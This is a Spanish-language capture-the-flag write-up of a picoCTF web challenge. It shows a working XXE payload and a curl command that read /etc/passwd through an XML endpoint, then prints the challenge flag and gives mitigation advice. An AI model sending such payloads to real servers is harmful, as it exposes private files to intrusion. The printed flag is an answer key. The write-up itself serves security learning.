## Descripción
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?
## Solución
- Accedemos al sitio web del reto proporcionado por la instancia.
- Al interactuar con la aplicación web e inspeccionar las solicitudes HTTP en la pestaña Network de las herramientas de desarrollo, se observó que al solicitar los detalles de un producto se enviaba una petición POST al endpoint `/data` con un cuerpo en formato XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<data><ID>1</ID></data>
```
- La aplicación responde reflejando los detalles asociados al identificador enviado, lo que confirma que el servidor procesa y analiza el XML en el backend.
- Comprobamos si el analizador XML es vulnerable a inyección XXE (XML External Entity) definiendo una entidad externa en el `DOCTYPE` que apunte al archivo local `/etc/passwd`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```
- Enviamos la petición modificada hacia el endpoint `/data` utilizando `curl` (o mediante las herramientas del navegador / Burp Suite):
```bash
curl -X POST http://saturn.picoctf.net:<PUERTO>/data \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><data><ID>&xxe;</ID></data>'
```
- El servidor procesa la entidad externa, lee el archivo `/etc/passwd` y lo devuelve reflejado en la respuesta con la bandera:
```text
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```
## Notas Adicionales
- XML External Entity (XXE) Injection: Vulnerabilidad que afecta a aplicaciones que procesan documentos XML no confiables con un analizador que tiene habilitada la resolución de entidades externas.
- Directiva SYSTEM: Palabra clave en la definición del tipo de documento (DTD) que instruye al analizador a cargar datos desde una URI local o remota (como `file:///etc/passwd`).
- Mitigación de XXE: Para prevenir este tipo de ataques, se debe configurar el analizador XML para deshabilitar la resolución de DTDs externas (`disallow-doctype-decl`) y la expansión de entidades externas en el servidor.
## Referencias
- [OWASP - XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger - XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)